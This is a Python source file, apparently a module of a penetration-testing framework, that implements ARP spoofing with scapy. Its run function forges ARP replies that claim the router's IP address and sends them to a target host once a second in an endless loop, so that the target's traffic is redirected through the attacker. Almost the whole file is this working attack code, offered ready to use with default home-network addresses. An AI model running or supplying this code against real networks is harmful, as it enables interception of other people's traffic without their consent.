#		Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
from core import colors
from collections import OrderedDict
import subprocess
from scapy.all import *
from time import sleep


conf = {
	"name": "arp_spoof",
	"version": "1.0",
	"shortdesc": "arp spoof",
	"github": "4shadoww",
	"author": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"initdate": "10.3.2016",
	"needroot": 1
}


# List of the variables
variables = OrderedDict((
	('target', '192.168.1.3'),
	('router', '192.168.1.1'),
))

# Description for variables
vdesc = [
	'target ip address',
	'router ip address',
]

# Additional help notes
help_notes = colors.red+"this module will not work without root permission!"+colors.end

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print (colors.blue + "[*]Setting Up ..." + colors.end)
	print(colors.green + "[OK]" + colors.end)
	sleep(1)
	print(colors.blue + "[*]ARP Poisoning Has Been Started ..." + colors.end)
	packet = ARP()
	packet.psrc = variables['router']
	packet.pdst = variables['target']
	while 1:
		send(packet, verbose=False)
		sleep(1)